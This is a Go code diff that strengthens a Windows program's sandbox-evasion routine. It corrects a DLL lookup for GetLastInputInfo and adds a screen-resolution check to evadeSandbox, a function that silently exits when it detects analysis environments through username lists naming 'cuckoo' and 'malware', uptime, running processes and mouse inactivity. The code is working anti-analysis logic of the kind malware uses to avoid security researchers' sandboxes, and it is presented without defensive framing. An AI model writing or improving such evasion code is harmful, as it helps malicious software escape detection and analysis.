@@ -14,6 +14,8 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+var modUser32 = windows.NewLazySystemDLL("user32.dll")
+
 var sandboxUsernames = []string{
 	"sandbox", "maltest", "malware", "virus", "sample", "test",
 	"admin", "analyst", "user", "john", "honey", "cuckoo",
@@ -187,14 +189,29 @@ func isSandboxProcessRunning() bool {
 
 // hasRecentMouseActivity checks if there's been recent user input (cursor moved).
 // Sandboxes typically show zero mouse activity.
+// GetLastInputInfo is in user32.dll, not kernel32.dll.
 func hasRecentMouseActivity() bool {
 	var li lastInputInfo
 	li.CbSize = uint32(unsafe.Sizeof(li))
-	modKernel32.NewProc("GetLastInputInfo").Call(uintptr(unsafe.Pointer(&li)))
+	modUser32.NewProc("GetLastInputInfo").Call(uintptr(unsafe.Pointer(&li)))
 	tick, _, _ := modKernel32.NewProc("GetTickCount").Call()
 	idleMs := uint32(tick) - li.DwTime
 	// If idle > 10 minutes, suspicious
 	return idleMs < uint32(10*time.Minute/time.Millisecond)
+}
+
+// isSmallScreen returns true when the primary display is smaller than a typical
+// workstation screen. Automated sandboxes are commonly configured with 800×600
+// or 1024×600 to save resources; real user machines are ≥ 1024×768.
+func isSmallScreen() bool {
+	const (
+		smCxScreen = 0
+		smCyScreen = 1
+	)
+	getSystemMetrics := modUser32.NewProc("GetSystemMetrics")
+	cx, _, _ := getSystemMetrics.Call(uintptr(smCxScreen))
+	cy, _, _ := getSystemMetrics.Call(uintptr(smCyScreen))
+	return cx > 0 && cy > 0 && (cx < 1024 || cy < 768)
 }
 
 // evadeSandbox exits silently when a sandbox or analysis environment is detected.
@@ -205,6 +222,7 @@ func evadeSandbox() {
 		isSandboxUsername() ||
 		isShortUptime() ||
 		isSandboxProcessRunning() ||
+		isSmallScreen() ||
 		!hasRecentMouseActivity() {
 		os.Exit(0)
 	}
